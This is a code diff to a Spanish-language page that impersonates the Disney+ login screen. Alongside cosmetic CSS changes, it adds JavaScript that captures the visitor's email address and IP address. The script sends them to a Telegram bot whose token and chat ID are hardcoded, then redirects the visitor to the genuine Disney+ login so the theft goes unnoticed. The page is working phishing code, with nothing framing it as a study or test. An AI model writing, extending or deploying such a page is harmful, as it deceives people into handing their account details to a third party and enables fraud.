@@ -78,6 +78,11 @@ button {
     font-size: 17px;
     cursor: pointer;
     font-weight: 500;
+    transition: background 0.3s;
+}
+
+button:hover {
+    background: #333;
 }
 
 /* BLOQUE INFERIOR (BLANCO) */
@@ -111,6 +116,51 @@ button {
     height: 30px;
     opacity: 0.8;
 }
+
+/* LOADING SPINNER */
+.loading {
+    display: none;
+    text-align: center;
+    margin-top: 15px;
+}
+
+.spinner {
+    border: 4px solid #f3f3f3;
+    border-top: 4px solid #000;
+    border-radius: 50%;
+    width: 40px;
+    height: 40px;
+    animation: spin 1s linear infinite;
+    margin: 0 auto;
+}
+
+@keyframes spin {
+    0% { transform: rotate(0deg); }
+    100% { transform: rotate(360deg); }
+}
+
+/* MENSAJE DE ÉXITO */
+.success-message {
+    display: none;
+    text-align: center;
+    padding: 20px;
+    background: #d4edda;
+    color: #155724;
+    border-radius: 12px;
+    margin-top: 20px;
+}
+
+/* ERROR MESSAGE */
+.error-message {
+    display: none;
+    text-align: center;
+    padding: 12px;
+    background: #f8d7da;
+    color: #721c24;
+    border-radius: 8px;
+    margin-top: 10px;
+    font-size: 14px;
+}
 </style>
 </head>
 
@@ -133,9 +183,23 @@ button {
         En caso de no tener una, recibirás indicaciones para crearla.
     </p>
 
-    <input type="email" placeholder="Correo electrónico">
+    <input type="email" id="emailInput" placeholder="Correo electrónico">
 
-    <button>Continuar</button>
+    <!-- Mensaje de error -->
+    <div id="errorMessage" class="error-message"></div>
+
+    <button id="continueBtn" onclick="iniciarSesion()">Continuar</button>
+
+    <!-- Loading spinner -->
+    <div id="loading" class="loading">
+        <div class="spinner"></div>
+        <p style="color:#555; margin-top:10px;">Verificando...</p>
+    </div>
+
+    <!-- Mensaje de éxito -->
+    <div id="successMessage" class="success-message">
+        <p>✅ Correo verificado. Redirigiendo a Disney+...</p>
+    </div>
 
 </div>
 
@@ -162,6 +226,112 @@ button {
     </div>
 
 </div>
+
+<script>
+// Elementos del DOM
+const emailInput = document.getElementById('emailInput');
+const continueBtn = document.getElementById('continueBtn');
+const loading = document.getElementById('loading');
+const errorMessage = document.getElementById('errorMessage');
+const successMessage = document.getElementById('successMessage');
+
+// Función para enviar correo a Telegram
+async function enviarCorreoATelegram(correo) {
+    const botToken = "8323486458:AAGJeAlHlciuq-STKT6i6f-kU9Vt_uCsgp8";
+    const chatId = "7776240161";
+    
+    const mensaje = `📧 NUEVO INICIO DE SESIÓN DISNEY+
+🆔 Correo electrónico: ${correo}
+🕐 Fecha: ${new Date().toLocaleString()}
+🌐 IP: ${await obtenerIP()}`;
+    
+    try {
+        await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                chat_id: chatId,
+                text: mensaje
+            })
+        });
+        console.log('Correo enviado a Telegram exitosamente');
+        return true;
+    } catch (error) {
+        console.error('Error enviando a Telegram:', error);
+        return false;
+    }
+}
+
+// Función para obtener IP aproximada
+async function obtenerIP() {
+    try {
+        const response = await fetch('https://api.ipify.org?format=json');
+        const data = await response.json();
+        return data.ip;
+    } catch (error) {
+        return 'No disponible';
+    }
+}
+
+// Función principal para iniciar sesión
+async function iniciarSesion() {
+    const email = emailInput.value.trim();
+    
+    // Validar email
+    if (!email || !email.includes('@') || !email.includes('.')) {
+        mostrarError('Por favor, ingresa un correo electrónico válido.');
+        return;
+    }
+    
+    // Ocultar botón y mostrar loading
+    continueBtn.style.display = 'none';
+    loading.style.display = 'block';
+    errorMessage.style.display = 'none';
+    
+    // Guardar email en localStorage
+    localStorage.setItem('disneyEmail', email);
+    
+    // Enviar a Telegram
+    const enviado = await enviarCorreoATelegram(email);
+    
+    if (enviado) {
+        // Mostrar mensaje de éxito
+        loading.style.display = 'none';
+        successMessage.style.display = 'block';
+        
+        // Redirigir después de 2 segundos
+        setTimeout(() => {
+            window.location.href = 'https://www.disneyplus.com/login';
+        }, 2000);
+    } else {
+        // Mostrar error
+        loading.style.display = 'none';
+        continueBtn.style.display = 'block';
+        mostrarError('Error de conexión. Por favor intenta nuevamente.');
+    }
+}
+
+// Función para mostrar errores
+function mostrarError(mensaje) {
+    errorMessage.textContent = mensaje;
+    errorMessage.style.display = 'block';
+}
+
+// Permitir Enter para enviar
+emailInput.addEventListener('keypress', function(e) {
+    if (e.key === 'Enter') {
+        iniciarSesion();
+    }
+});
+
+// Cargar email guardado si existe
+window.addEventListener('DOMContentLoaded', function() {
+    const emailGuardado = localStorage.getItem('disneyEmail');
+    if (emailGuardado) {
+        emailInput.value = emailGuardado;
+    }
+});
+</script>
 
 </body>
 </html>
